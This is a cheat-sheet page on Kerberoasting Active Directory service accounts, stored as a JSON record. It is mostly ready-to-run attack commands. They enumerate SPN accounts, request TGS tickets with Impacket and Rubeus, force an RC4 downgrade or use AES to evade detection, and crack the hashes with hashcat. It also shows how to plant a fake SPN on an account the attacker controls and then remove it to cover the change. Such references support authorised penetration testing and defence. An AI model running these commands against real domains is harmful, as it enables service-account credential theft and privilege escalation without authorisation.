{"title": "kerberoasting", "source": "cheatsheet", "source_label": "Cheat Sheets", "path": "cheatsheet/ref-windows-kerberoasting", "html": "<h1 id=\"windows-kerberoasting\">kerberoasting</h1>\n<p>Request TGS tickets for accounts with SPNs registered, then crack them offline. Works with any valid domain credentials. Service accounts often have weak passwords and high privileges.</p>\n<h3>When to Use</h3>\n<p>- Have valid domain credentials (any user) - Want to target service accounts (often have weak passwords + high privs) - SPNs registered on user accounts (not machine accounts -- those have random passwords)</p>\n<h3>Enumeration</h3>\n<h4>Find SPNs with ldapsearch</h4>\n<pre><code class=\"language-bash\">ldapsearch -H ldap://DC -D &#x27;user@domain.local&#x27; -w &#x27;pass&#x27; \\\n  -b &#x27;DC=domain,DC=local&#x27; \\\n  &#x27;(&amp;(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))&#x27; \\\n  sAMAccountName servicePrincipalName memberOf</code></pre>\n<h4>Find SPNs with PowerView</h4>\n<pre><code class=\"language-powershell\">Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof</code></pre>\n<h3>Attack - Impacket</h3>\n<h4>All kerberoastable users</h4>\n<pre><code class=\"language-bash\">GetUserSPNs.py &#x27;domain.local/user:pass&#x27; -dc-ip DC_IP -request -outputfile kerberoast.txt</code></pre>\n<h4>Targeted (single user)</h4>\n<pre><code class=\"language-bash\">GetUserSPNs.py &#x27;domain.local/user:pass&#x27; -dc-ip DC_IP -request-user svc_target -outputfile kerberoast.txt</code></pre>\n<h4>With Kerberos auth (pass-the-ticket)</h4>\n<pre><code class=\"language-bash\">export KRB5CCNAME=/path/to/ticket.ccache\nGetUserSPNs.py &#x27;domain.local/user&#x27; -k -no-pass -dc-ip DC_IP -request -outputfile kerberoast.txt</code></pre>\n<h3>Attack - Rubeus</h3>\n<h4>All kerberoastable users</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe kerberoast /outfile:kerberoast.txt</code></pre>\n<h4>Targeted kerberoasting (single SPN)</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe kerberoast /user:svc_target /outfile:kerberoast.txt</code></pre>\n<h4>RC4 downgrade (forces weaker encryption, easier to crack)</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.txt</code></pre>\n<h4>AES kerberoasting (opsec-safe, avoids RC4 detection)</h4>\n<pre><code class=\"language-powershell\">.\\Rubeus.exe kerberoast /aes /outfile:kerberoast.txt</code></pre>\n<h3>Cracking</h3>\n<h4>Hashcat - RC4 (type 23)</h4>\n<pre><code class=\"language-bash\">hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>\n<h4>Hashcat - AES256 (type 17)</h4>\n<pre><code class=\"language-bash\">hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt</code></pre>\n<h4>Hashcat - AES128 (type 18)</h4>\n<pre><code class=\"language-bash\">hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt</code></pre>\n<h3>Targeted Kerberoasting (Set SPN)</h3>\n<p>If you have GenericAll/GenericWrite over a user, you can set an SPN on them, then kerberoast.</p>\n<h4>Set SPN with PowerView</h4>\n<pre><code class=\"language-powershell\">Set-DomainObject -Identity targetuser -Set @{serviceprincipalname=&#x27;fake/spn&#x27;}</code></pre>\n<h4>Set SPN with bloodyAD</h4>\n<pre><code class=\"language-bash\">bloodyAD -d domain.local -u user -p pass --host DC_IP set object targetuser servicePrincipalName -v &#x27;fake/spn&#x27;</code></pre>\n<h4>Clean up after</h4>\n<pre><code class=\"language-powershell\">Set-DomainObject -Identity targetuser -Clear serviceprincipalname</code></pre>\n<h3>Notes</h3>\n<p>- Machine accounts ($) have 120-char random passwords -- skip them - RC4 tickets crack orders of magnitude faster than AES - RC4 downgrade (<code>/tgtdeleg</code>) may trigger alerts in mature environments - If cracking fails, try larger wordlists or custom rules targeting the org</p>", "excerpt": "kerberoasting Request TGS tickets for accounts with SPNs registered, then crack them offline. Works with any valid domain credentials. Service accounts often have weak passwords and high privileges. W…", "tags": ["reference", "windows"]}